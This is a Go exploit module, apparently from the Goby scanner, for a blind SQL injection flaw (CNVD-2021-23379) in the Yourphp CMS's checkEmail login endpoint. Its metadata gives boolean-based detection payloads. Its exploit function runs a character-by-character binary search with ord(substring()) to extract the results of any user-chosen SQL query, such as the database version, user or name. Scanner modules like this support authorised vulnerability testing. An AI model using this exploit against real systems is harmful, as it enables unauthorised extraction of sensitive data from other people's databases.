package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strconv"
)

func init() {
    expJson := `{
    "Name": "Yourphp SQLI vulnerability(CNVD-2021-23379)",
    "Description": "<p>Yourphp enterprise website management system is a free PHP+MYSQL system, the core is based on the Thinkphp framework highly refined secondary development.</p><p>There is a SQL injection vulnerability in youphp enterprise website management system. An attacker can exploit the vulnerability to obtain database sensitive information.</p>",
    "Product": "Yourphp",
    "Homepage": "https://www.yourphp.com/",
    "DisclosureDate": "2021-04-20",
    "Author": "Str3am",
    "FofaQuery": "header=\"YP_onlineid\"",
    "GobyQuery": "header=\"YP_onlineid\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit vulnerabilities to obtain database sensitive information</p>",
    "Recommendation": "<p>At present, there is no detailed solution available, please follow the manufacturer's home page update: <a href=\"https://www.yourphp.com/\">https://www.yourphp.com/</a></p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-23379"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "select",
            "value": "version(),user(),database()"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-3426%27%20OR%201=1%20AND%20%27RYHI%27=%27RYHI",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "==",
                        "value": "false",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-3426%27%20OR%201=2%20AND%20%27RYHI%27=%27RYHI",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "==",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2021-23379"
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "Yourphp SQL 注入漏洞",
            "Product": "Yourphp",
            "Description": "<p>Yourphp企业网站管理系统是一款免费的PHP+MYSQL系统，核心是基于Thinkphp框架高度精减二次开发的。</p><p>youphp企业网站管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。</p>",
            "Recommendation": "<p><span style=\"color: rgb(22, 28, 37); font-size: medium;\">目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.yourphp.com/\" style=\"\">https://www.yourphp.com/</a></span><br></p>",
            "Impact": "<p>youphp企业网站管理系统存在SQL注入漏洞，攻击者可利用漏洞获取数据库敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yourphp SQLI vulnerability(CNVD-2021-23379)",
            "Product": "Yourphp",
            "Description": "<p>Yourphp enterprise website management system is a free PHP+MYSQL system, the core is based on the Thinkphp framework highly refined secondary development.</p><p>There is a SQL injection vulnerability in youphp enterprise website management system. An attacker can exploit the vulnerability to obtain database sensitive information.</p>",
            "Recommendation": "<p>At present, there is no detailed solution available, please follow the manufacturer's home page update: <a href=\"https://www.yourphp.com/\">https://www.yourphp.com/</a><br></p>",
            "Impact": "<p>Attackers can exploit vulnerabilities to obtain database sensitive information<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            target := expResult.HostInfo.HostInfo
            i := 0
            result := ""
            for {
                i = i + 1
                low := 31
                high := 127
                for low <= high {
                    mid := (low + high) / 2
                    url := target + "/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-3426%27%20OR%20if(ord(substring((" + ss.Params["sql"].(string) + ")," + strconv.Itoa(i) + ",1))>" + strconv.Itoa(mid) + ",1,0)%20AND%20%27RYHI%27=%27RYHI"
                    fmt.Println(url)
                    res, err := httpclient.SimpleGet(url)
                    if err == nil {
                        //fmt.Println(err)
                        resContent := res.RawBody
                        //println(string(resContent))
                        if string(resContent) == "false" {
                            low = mid + 1
                        } else {
                            high = mid - 1
                        }
                    }
                }
                if low != 31 && high != 127 {
                    result = result + string(rune(low))
                    //fmt.Println(result)
                } else {
                    expResult.Success = true
                    expResult.Output = result
                    break
                }
            }
            return expResult
        },
    ))
}
